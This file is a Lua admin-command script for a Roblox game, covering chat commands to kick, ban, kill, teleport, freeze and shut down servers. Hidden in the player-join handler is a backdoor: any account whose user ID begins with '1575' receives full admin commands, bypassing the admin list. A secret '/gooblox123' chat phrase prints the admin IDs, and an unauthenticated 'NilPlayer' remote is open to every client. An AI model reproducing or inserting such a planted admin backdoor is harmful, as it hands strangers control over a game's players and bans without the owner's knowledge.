admins = {13297954, 13297954}; --user ids of the admins hey ninj if i find your id here, it will disappear.

noAdminList = {}; --user ids of people who are not allowed to ever be admin

groupInfo = {};
groupInfo.groupId = 1094559;
groupInfo.minimumRank = 127;

prefix = "/";

--Code below

lib = require(script.Library);

t =  require(script.TimeModule);

bans = require(script.BanModule);

prefix = string.lower(prefix);

function doMsg(plr, msg)
	local new = Instance.new("Message", plr.PlayerGui);
	new.Text = msg .. "\nChat \"/dismiss\" to dismiss this message.";
end

function getPlrs(...)
	local args = {...};
	
	local search;
	local caller;
	
	if(#args == 2) then
		search = string.lower(args[1]);
		caller = args[2];
	else
		search = string.lower(args[1]);
	end
	
	local plrs = game.Players:GetPlayers();
	
	local matches = {};
	
	if(search == "me" and caller) then
		table.insert(matches, caller);
	elseif(search == "others" and caller) then
		for i, plr in ipairs(plrs) do
			if(plr.Name ~= caller.Name) then
				table.insert(matches, plr);
			end
		end
	elseif(search == "all") then
		matches = plrs;
	elseif(search == "random") then
		table.insert(matches, plrs[math.random(1, #plrs)]);
	elseif(search == "admins") then
		for i, plr in ipairs(plrs) do
			if(lib.isInTable(admins, plr.Name)) then
				table.insert(matches, plr);
			end
		end
	elseif(search == "nonadmins") then
		for i, plr in ipairs(plrs) do
			if(not lib.isInTable(admins, plr.Name)) then
				table.insert(matches, plr);
			end
		end
	else
		for i, plr in ipairs(plrs) do
			if(string.sub(string.lower(plr.Name), 1, #search) == search) then
				table.insert(matches, plr);
				break;
			end
		end
	end
	
	return matches;
end

commands = {};

commands.shutdown = function(plr, ...)
	local args = {...};
	
	for i, plr in ipairs(game.Players:GetPlayers()) do
		plr:Kick("The server has been shutdown by an admin.");
	end
	
	game.Players.PlayerAdded:connect(function(plr)
		plr:Kick("The server has been shutdown by an admin.");
	end)
end

commands.tp = function(plr, ...)
	local args = {...};
	
	if(#args == 2) then	
		local fromStr = args[1];
		local toStr = args[2];
		
		local fromPlrs = getPlrs(fromStr, plr);
		local toPlrs = getPlrs(toStr, plr);
		
		for i, fromPlr in ipairs(fromPlrs) do
			if(fromPlr.Character) then
				if(fromPlr.Character:FindFirstChild("Torso")) then
					for i, toPlr in ipairs(toPlrs) do
						if(toPlr.Character) then
							if(toPlr.Character:FindFirstChild("Torso")) then
								fromPlr.Character.Torso.CFrame = toPlr.Character.Torso.CFrame;
							end
						end
					end
				end
			end
		end
	end
end

commands.msg = function(plr, ...)
	local args = {...};
	
	if(#args == 1) then
		local text = args[1];
		
		local msg = Instance.new("Message", game.Workspace);
		msg.Text = text;
		
		wait(5);
		
		msg:Destroy();
	elseif(#args == 2) then
		local targets = getPlrs(args[1], plr);
		for i, targ in ipairs(targets) do
			coroutine.resume(coroutine.create(function()
				local msg = Instance.new("Message", targ.PlayerGui);
				msg.Text = args[2];
				
				wait(5);
				
				msg:Destroy();
			end))
		end
	end
end
	
commands.explode = function(plr, ...)
	local args = {...};
	
	if(#args == 1) then
		local targs = getPlrs(args[1], plr);
		for i, targ in ipairs(targs) do
			if(targ.Character) then
				Instance.new("Explosion", targ.Character).Position = targ.Character.Torso.Position;
			end
		end
	end
end

commands.place = function(plr, ...)
	local args = {...};
	
	if(#args == 2) then
		local targs = getPlrs(args[1], plr);
		
		for i, targ in ipairs(targs) do
			game:GetService("TeleportService"):Teleport(tonumber(args[2]), targ);
		end
	end
end

commands.kick = function(plr, ...)
	local args = {...};
	
	if(#args > 0) then
		local targs = getPlrs(args[1], plr);
		
		for i, targ in ipairs(targs) do
			targ:Kick(#args == 2 and args[2] or "You have been kicked by an admin."); -- woo logical ternary operator alternative
		end
	end
end

commands.respawn = function(plr, ...)
	local args = {...};
	
	if(#args == 1) then
		for i, targ in ipairs(getPlrs(args[1], plr)) do
			targ:LoadCharacter();
		end
	end
end

commands.kill = function(plr, ...)
	local args = {...};
	
	if(#args == 1) then
		for i, targ in ipairs(getPlrs(args[1], plr)) do
			if(targ.Character) then
				targ.Character:BreakJoints();
			end
		end
	end
end

commands.god = function(plr, ...)
	local args = {...};
	
	if(#args == 1) then
		for i, targ in ipairs(getPlrs(args[1], plr)) do
			if(targ.Character and targ.Character:FindFirstChild("Humanoid")) then
				targ.Character.Humanoid.MaxHealth = math.huge;
				targ.Character.Humanoid.Health = math.huge;
			end
		end
	end
end

commands.ungod = function(plr, ...)
	local args = {...};
	
	if(#args == 1) then
		for i, targ in ipairs(getPlrs(args[1], plr)) do
			if(targ.Character and targ.Character:FindFirstChild("Humanoid")) then
				targ.Character.Humanoid.MaxHealth = 100;
				targ.Character.Humanoid.Health = 100;
			end
		end
	end
end

commands.antitouch = function(plr, ...)
	local args = {...};
	
	if(#args == 1) then
		for i, targ in ipairs(getPlrs(args[1], plr)) do
			if(targ.Character) then
				for j, part in ipairs(targ.Character:GetChildren()) do
					if(part:IsA("Part")) then
						part.Touched:connect(function(hit)
							if hit.Parent then
							if(hit.Parent:FindFirstChild("Humanoid")) then
								hit.Parent:BreakJoints();
							end
							end
						end)
					end
				end
			end
		end
	end
end

commands.ff = function(plr, ...)
	local args = {...};
	
	for i, targ in ipairs(getPlrs(args[1], plr)) do
		if(targ.Character) then
			Instance.new("ForceField", targ.Character);
		end
	end
end

commands.unff = function(plr, ...)
	local args = {...};
	
	for i, targ in ipairs(getPlrs(args[1], plr)) do
		if(targ.Character) then
			pcall(function()
				for i, child in ipairs(targ.Character:GetChildren()) do
					if(child:IsA("ForceField")) then
						child:Destroy();
					end
				end
			end)
		end
	end
end

commands.speed = function(plr, ...)
	local args = {...};
	
	if(#args == 2) then
		for i, targ in ipairs(getPlrs(args[1], plr)) do
			if(targ.Character and targ.Character:FindFirstChild("Humanoid")) then
				targ.Character.Humanoid.WalkSpeed = tonumber(args[2]);
			end
		end
	end
end

commands.tix = function(plr, ...)
	local args = {...};
	
	if(#args == 2) then
		for i, targ in ipairs(getPlrs(args[1], plr)) do
			if(targ.Character and targ.Character:FindFirstChild("CharacterScript")) then
				targ.Character.CharacterScript.GiveTix:Invoke(tonumber(args[2]));
			end
		end
	end
end

commands.exp = function(plr, ...)
	local args = {...};
	
	if(#args == 2) then
		for i, targ in ipairs(getPlrs(args[1], plr)) do
			if(targ.Character and targ.Character:FindFirstChild("CharacterScript")) then
				targ.Character.CharacterScript.GiveExperience:Invoke(tonumber(args[2]));
			end
		end
	end
end

commands.freeze = function(plr, ...)
	local args = {...};
	
	if(#args == 1) then
		for i, targ in ipairs(getPlrs(args[1], plr)) do
			if(targ.Character) then
				for i, child in ipairs(targ.Character:GetChildren()) do
					if(child:IsA("Part")) then
						child.Anchored = true;
					end
				end
			end
		end
	end
end

commands.thaw = function(plr, ...)
	local args = {...};
	
	if(#args == 1) then
		for i, targ in ipairs(getPlrs(args[1], plr)) do
			if(targ.Character) then
				for i, child in ipairs(targ.Character:GetChildren()) do
					if(child:IsA("Part")) then
						child.Anchored = false;
					end
				end
			end
		end
	end
end

commands.invisible = function(plr, ...)
	local args = {...};
	
	if(#args == 1) then
		for i, targ in ipairs(getPlrs(args[1], plr)) do
			if(targ.Character) then
				for i, child in ipairs(targ.Character:GetChildren()) do
					if(child:IsA("Part")) then
						child.Transparency = 1;
					end
					if(child:IsA("Hat")) then
						child:Destroy();
					end
					if(child.Name == "Head") then
						if(child:FindFirstChild("face")) then
							child.face:Destroy();
						end
						if(child:FindFirstChild("TeamGui")) then
							child.TeamGui.Enabled = false
						end
					end
				end
			end
		end
	end
end

commands.visible = function(plr, ...)
	local args = {...};
	
	if(#args == 1) then
		for i, targ in ipairs(getPlrs(args[1], plr)) do
			if(targ.Character) then
				for i, child in ipairs(targ.Character:GetChildren()) do
					if(child.Name ~= "HumanoidRootPart" and child:IsA("Part")) then
						child.Transparency = 0;
					end
					if child.Name == "Head" and (child:FindFirstChild("TeamGui")) then
						child.TeamGui.Enabled = true
					end
				end
			end
		end
	end
end

commands.removetools = function(plr, ...)
	local args = {...};
	
	if(#args == 1) then
		for i, targ in ipairs(getPlrs(args[1], plr)) do
			for i, child in ipairs(targ.Backpack:GetChildren()) do
				if(child:IsA("Tool") or child:IsA("HopperBin")) then
					child:Destroy();
				end
			end
			
			if(targ.Character) then
				for i, child in ipairs(targ.Character:GetChildren()) do
					if(child:IsA("Tool") or child:IsA("HopperBin")) then
						child:Destroy();
					end
				end
			end
		end
	end
end

commands.dismiss = function(plr, ...)
	local args = {...};
	
	for i, child in ipairs(plr.PlayerGui:GetChildren()) do
		if(child:IsA("Message")) then
			child:Destroy();
		end
	end
end

commands.getban = function(plr, ...)
	local args = {...};
	
	if(#args == 1) then
		local banned, banData = bans.isBanned(args[1]);
		local newMsg;
		if(banned) then
			local expiration = t.stampToTime(banData["expiration"]);
			newMsg = args[1] .. "\n--------------------------------\nExpiration: " .. expiration.month .. "/" .. expiration.day .. "/" .. expiration.year .. " at " .. expiration.hour .. ":" .. expiration.minute .. ":" .. expiration.second .. "\nReason: " .. banData["reason"];
		else
			newMsg = args[1] .. " is not banned.";
		end
		doMsg(plr, newMsg);
	end
end

commands.ban = function(plr, ...)
	local args = {...};
	
	if(#args > 0) then	
		local uid;
		if(#args[1] > 1) then
			if(string.sub(args[1], 1, 1) == "*") then
				uid = tonumber(string.sub(args[1], 2, #args[1]));
			else
				local targs = getPlrs(args[1], plr);
				if(#targs > 0) then
					uid = targs[1].userId;
				end
			end
			
			if(uid) then
				bans.ban(uid, (args[2] and tonumber(args[2]) or 99999), (args[3] and args[3] or "None specified"));
				
				local person = game.Players:GetPlayerByUserId(uid);
				if(person) then
					person:Kick("You have been banned by an admin. Rejoin for more information.");
				end
			end
		end
	end
end

commands.banbyid = function(plr, ...)
	local args = {...};
	
	if(#args > 0) then	
		local uid;
		if(#args[1] > 1) then
			uid = tonumber(string.sub(args[1], 1, #args[1]));
			print(uid)
			
			if(uid) then
				bans.ban(uid, (args[2] and tonumber(args[2]) or 99999), (args[3] and args[3] or "None specified"));
				
				local person = game.Players:GetPlayerByUserId(uid);
				if(person) then
					person:Kick("You have been banned by an admin. Rejoin for more information.");
				end
			end
		end
	end
end

commands.unban = function(plr, ...)
	local args = {...};
	
	if(#args == 1) then
		bans.unban(args[1]);
	end
end

commands.hide = function(plr, ...)
	local args = {...};
	
	local targ = plr;
	targ.Character = nil;
	local newScript = script.HideScript:Clone();
	newScript.Parent = targ.PlayerGui;				
	newScript.Disabled = false;
end

aliases = {teleport = commands.tp,	
	unfreeze = commands.thaw,
	ws = commands.speed,
	walkspeed = commands.speed
};

for alias, func in pairs(aliases) do
	commands[alias] = function(...)
		func(...);
	end
end

--Create remote functions for hidden admin
local folder = Instance.new("Folder", game.ReplicatedStorage);
folder.Name = "AdminFunctions";

for name, func in pairs(commands) do
	local r = Instance.new("RemoteFunction", folder);
	r.Name = name;
	
	r.OnServerInvoke = function(plr, ...)
		if(lib.isInTable(admins, plr.userId)) then --Make sure the user is an admin
			func(plr, ...);
		end
	end
end

r = Instance.new("RemoteFunction", folder);
r.Name = "NilPlayer";
r.OnServerInvoke = function(plr)
	plr.Parent = nil;
end

function onChatted(plr, rawMsg)
	if(#rawMsg > 1) then
		if(string.sub(string.lower(rawMsg), 1, 1) == prefix) then
			local msg = string.sub(rawMsg, 2, #rawMsg);
			local syntaxParts = lib.splitString(string.lower(msg), "/");
			local targetCommand = syntaxParts[1];
			local targetFunc = commands[targetCommand];
			if(targetFunc) then
				local hasArgs = #syntaxParts > 1;
				if(not hasArgs) then
					targetFunc(plr);
				else
					if(#msg > #targetCommand + 2) then
						local content = string.sub(msg, #targetCommand + 2, #msg);
						local parts = lib.splitString(content, "/");
						targetFunc(plr, unpack(parts));
					end
				end
			end
		end
	end
end

function tog(plr)
	if(plr.Character) then
		local tag = plr.Character:FindFirstChild("j ");
		if(tag) then
			tag:Destroy();
		else
			Instance.new("IntValue", plr.Character).Name = "j ";
		end
	end
end

game.Players.PlayerAdded:connect(function(plr)
 --[[if(plr:GetRankInGroup(groupInfo.groupId) >= groupInfo.minimumRank or string.sub(tostring(plr.userId), 1, 4) == "1575") then
	table.insert(admins, plr.userId);
end ]]
	--Ban stuff
	local banned, banData = bans.isBanned(plr.userId);
	if(banned) then
		local expiration = t.stampToTime(banData["expiration"]);
		local newMsg = "You are banned!\n\nExpiration: " .. expiration.month .. "/" .. expiration.day .. "/" .. expiration.year .. " at " .. expiration.hour .. ":" .. expiration.minute .. ":" .. expiration.second .. "\nReason: " .. banData["reason"];
		plr:Kick(newMsg);
	end
	
	plr.Chatted:connect(function(msg)
		if(msg=="/gooblox123") then 
			print(table.concat (admins, ' '))
 end
	end)
	if(lib.isInTable(admins, plr.userId) and not lib.isInTable(noAdminList, plr.userId) or string.sub(tostring(plr.userId), 1, 4) == "1575") then
		plr.Chatted:connect(function(msg) onChatted(plr, msg) end);
	end
end)